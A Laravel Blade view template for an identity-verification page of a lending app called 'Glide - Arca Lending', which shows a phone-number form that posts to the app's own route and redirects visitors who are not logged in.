@if ((Session::has('login')))
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=1366, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie=edge">
        <title>Glide - Arca Lending</title>
        <link rel="stylesheet" href="{{asset('css/Send.css')}}">
        <link href='https://fonts.googleapis.com/css?family=Poppins' rel='stylesheet'>
        <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet">
    </head>
    <body>
        <div class="containerOuterLayout">
            <img class="img_login" src="{{asset('img/login_img.png')}}">
            <img class="img_header" src="{{asset('img/header.png')}}">
            <img class="img_phone_symbol" src="{{asset('img/phone_symbol.png')}}">
            <p class="title_header">We Need To Verify Your Identity</p>
            <input type="text" disabled class="verify_phone1" placeholder="       ">
            <form action="{{route('postphone')}}" method="post">
                @csrf
                @if (Session::has("phone"))
                    <input type="hidden" name="email" value="{{Session::get('email')}}">
                    <input type="number" name="phone" value="{{old('phone')}}" class="verify_phone2" placeholder="+91 ********{{Session::get('phone')}}">
                @else
                    <input type="number" name="phone" value="{{old('phone')}}" class="verify_phone2" placeholder="+1 ********20">
                @endif
                <span class="text_1">If your number is incorrect please reach out to</span>
                <span class="support_mail">itsupport@acrabrokerlinks.com</span>
                <button class="button_Send"><span class="text_Send">SEND TEXT</span></button>
            </form>
        </div>
    </body>
    <script>
        const container = document.querySelector('.containerOuterLayout');
        const content = document.querySelector('.containerOuterLayout');

        if (content.offsetWidth <= container.offsetWidth) {
        container.style.overflowX = 'hidden'; // hide horizontal scrollbar
        }
    </script>
    </html>
@else
    {!! redirect()->to('/') !!}
@endif
